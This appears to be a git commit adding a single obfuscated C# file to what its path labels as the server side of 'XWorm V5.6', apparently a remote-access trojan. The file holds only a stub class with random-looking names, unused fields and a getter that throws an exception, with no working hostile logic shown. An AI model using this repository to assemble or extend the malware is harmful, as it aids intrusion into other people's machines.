10788695c2df1460349eb8c7a705cbd3f0331d8e
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:13 +0400

    Forms47.cs

---
+++ XWorm V5.6/Server/Forms/Forms47.cs
@@ -0,0 +1,17 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+
+namespace M9A828E42D759F365M284C3875E9D76M
+{
+  public class M4790M163EDC4E5C4E0641M779E340A1
+  {
+    public static int L326LFDE278D2377264059C2A2845737;
+    public static int LE5125BD9A4E9L25814A26C4LCAF94B9;
+    public static int EA48F5D21BE8B337199FCB9C61D528C1;
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public bool get_hostOnly() => throw new Exception("あ");
+  }
+}
